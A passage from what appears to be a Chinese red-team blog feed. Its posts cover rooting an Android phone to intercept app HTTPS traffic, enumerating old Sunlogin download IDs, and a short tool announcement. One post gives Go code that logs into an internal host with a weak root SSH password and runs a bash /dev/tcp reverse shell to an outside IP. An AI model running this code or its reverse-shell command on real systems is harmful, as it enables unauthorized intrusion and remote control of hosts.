5G，不过mac系统下pd虚拟化的win10不行，需要物理机win10，然后又找了一台物理机win10，全程需要对方远程控制我电脑，很反感别人控制我电脑，好在那台物理机win10上面啥数据也没有，看对面一顿操作，最后成功root</p><p>通过观察他们的操作，发现他们其实是用的一款第三方付费工具UnlockTool，好像是一个越南团队开发的，这款工具其中一个root方式是利用联发科这款CPU的一个漏洞，正好OPPO A57 5G的CPU就是联发科</p><h1 id="0x05-成功抓包"><a href="#0x05-成功抓包" class="headerlink" title="0x05 成功抓包"></a>0x05 成功抓包</h1><p>手机root后成功安装了magisk，但是adb连接后权限还是shell，无法将证书装到系统证书目录下，尝试过Root Explorer，但是无法修改证书权限，最终通过magisk的模块MoveCertiticate成功将证书移到系统证书目录下，需要注意MoveCertiticate会从指定目录将证书移到系统证书目录下，所以需要先将证书放到/data/local/tmp/cert/下</p><p>另外有些app出于反调试目的，可能不走系统本身的代理，需要一款类似Proxifier的全局代理客户端，可以使用Postern</p><p>一切准备就绪后，尝试抓包，可成功抓到app的https包，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/02.png" alt="image">  </p><p>移动端抓包<br><a href="https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh=iQwYYv3iIPx7qEYoD">https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh%3DiQwYYv3iIPx7qEYoD</a><br><a href="https://blog.csdn.net/Arched/article/details/135777104">https://blog.csdn.net/Arched/article/details/135777104</a><br><a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a>  </p><h1 id="0x06-总结感悟"><a href="#0x06-总结感悟" class="headerlink" title="0x06 总结感悟"></a>0x06 总结感悟</h1><p>之前一直有一个问题，可以直接通过burp抓包，为何还要再通过charles或者fiddler中转一下，这次正好测试了一下，发现直接通过burp抓包，数据包从APP到burp需要好几秒，有点慢，而通过charles中转一下，则可以秒抓</p><p>最后，其实iOS下导入证书就可以抓https包，比Android省事多，所以条件允许的话，优先在iOS下抓包，但是像我这种没有iOS客户端的情况，就得折腾了~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;接到一个Android APP渗透的任务，尝试用模拟器抓包发现闪退，看来反模拟器，手里有一台手机，型</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>自动化连接ssh并反弹shell</title>
    <link href="http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2024-05-07T13:35:51.000Z</published>
    <updated>2025-10-09T14:24:45.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-应用场景"><a href="#0x01-应用场景" class="headerlink" title="0x01 应用场景"></a>0x01 应用场景</h1><p>一个命令执行的口子</p><p>主机不出网</p><p>当前是nobody权限，web目录是root权限，写webshell没权限</p><p>通过一个ctf技巧搞了一个webshell，能上传文件但是不能执行命令</p><p>通过webshell将fscan上传到/tmp目录下，通过入口的命令执行漏洞执行fscan，发现内网有ssh弱口令</p><h1 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>已知连接ssh的同时可以执行命令<br><img src="/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/image-20230731085919496.png" alt="image"><br>当时的想法是连接ssh，然后执行命令反弹shell，但是连接ssh需要交互式shell，第一时间想到expect，经测试主机上没有expect，然后想到通过python中的pexpect去做这件事，发现目标中的python缺少依赖，如果上传python依赖到对应的依赖库目录太麻烦了，最后想到用go去实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line"></span><br><span class="line">&quot;golang.org/x/crypto/ssh&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">username = &quot;root&quot;</span><br><span class="line">password = &quot;P@ssw0rd!&quot;</span><br><span class="line">addr     = &quot;10.62.139.19:22&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">config := &amp;ssh.ClientConfig &#123;</span><br><span class="line">User: username,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.Password(password),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client, err := ssh.Dial(&quot;tcp&quot;, addr, config)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to dial: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer client.Close()</span><br><span class="line"></span><br><span class="line">// 开启一个session，用于执行一个命令</span><br><span class="line">session, err := client.NewSession()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to create session: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"></span><br><span class="line">// 执行命令，并将执行的结果写到 b 中</span><br><span class="line">var b bytes.Buffer</span><br><span class="line">session.Stdout = &amp;b</span><br><span class="line"></span><br><span class="line">// 也可以使用 session.CombinedOutput() 整合输出</span><br><span class="line">if err := session.Run(&quot;bash -i &gt;&amp; /dev/tcp/123.249.104.83/1234 0&gt;&amp;1&quot;); err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to run: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(b.String())  // root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是在赌目标主机出网，盲打成功接收到反弹shell那一刻，还是挺爽的~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-应用场景&quot;&gt;&lt;a href=&quot;#0x01-应用场景&quot; class=&quot;headerlink&quot; title=&quot;0x01 应用场景&quot;&gt;&lt;/a&gt;0x01 应用场景&lt;/h1&gt;&lt;p&gt;一个命令执行的口子&lt;/p&gt;
&lt;p&gt;主机不出网&lt;/p&gt;
&lt;p&gt;当前是nobody权限，</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>小程序-多用户微博系统</title>
    <link href="http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/</id>
    <published>2024-05-07T13:30:01.000Z</published>
    <updated>2025-10-09T14:23:58.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，总觉得不懂开发就搞不好安全，现在也算圆了这个执念，学习开发对安全是有帮助的，不过现在想对那时的自己说一句，不用专门学开发也可以把安全搞得好</p><h1 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h1><p>一个简易的多用户微博系统，每个人都可以在上面留言，欢迎大家留言，地址：<a href="https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/">https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/</a></p><p>截图如下：<br><img src="/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/01.jpg" alt="image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，</summary>
      
    
    
    
    <category term="工具开发" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>分享一个自己开发的工具</title>
    <link href="http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
    <published>2024-05-07T13:25:18.000Z</published>
    <updated>2025-10-09T14:16:58.520Z</updated>
    
    <content type="html"><![CDATA[<p>程序流程如下<br><img src="/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.png" alt="image"></p><p>之前做红队时自己开发的工具，代码完全开源到GitHub，地址：<a href="https://github.com/ybdt/RuiningGather-Python">https://github.com/ybdt/RuiningGather-Python</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;程序流程如下&lt;br&gt;&lt;img src=&quot;/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.pn</summary>
      
    
    
    
    <category term="工具开发" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>向日葵旧版本下载</title>
    <link href="http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/</id>
    <published>2024-04-28T12:29:09.000Z</published>
    <updated>2025-10-09T14:23:48.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-成果"><a href="#0x01-成果" class="headerlink" title="0x01 成果"></a>0x01 成果</h1><p>可下载15.3.2.62919（截止到2024.04.03的最新版）到12.5.1.44969之间的任意版本，如下图<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/01.png" alt="image"><br>更旧的版本不能下载，原因见下文</p><h1 id="0x02-起源"><a href="#0x02-起源" class="headerlink" title="0x02 起源"></a>0x02 起源</h1><p>想用旧版本向日葵测试一个功能，发现官网只提供最新版下载，故研究下如何下载旧版本</p><h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><p>下载页面点击下载后，burp抓包，依次筛选每个请求包，发现如下请求包最像下载链接<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/02.png" alt="image">  如图可看到，根据参数versionid指定版本，试了下2225、2224都返回404，看来不是每个数字都有对应版本，写个python脚本生成1到2226的字典，请求包扔到Intruder中进行爆破，发现如上请求id返回302<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/03.png" alt="image">  ok，现在我们可以根据id下载对应版本</p><h1 id="0x04-遗憾"><a href="#0x04-遗憾" class="headerlink" title="0x04 遗憾"></a>0x04 遗憾</h1><p>经测试，版本SunloginClient_12.5.0.44227_x64.exe及之前的版本，下载后会返回404，猜测可能官方给删除了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-成果&quot;&gt;&lt;a href=&quot;#0x01-成果&quot; class=&quot;headerlink&quot; title=&quot;0x01 成果&quot;&gt;&lt;/a&gt;0x01 成果&lt;/h1&gt;&lt;p&gt;可下载15.3.2.62919（截止到2024.04.03的最新版）到12.5.1.44969之间的</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
</feed>
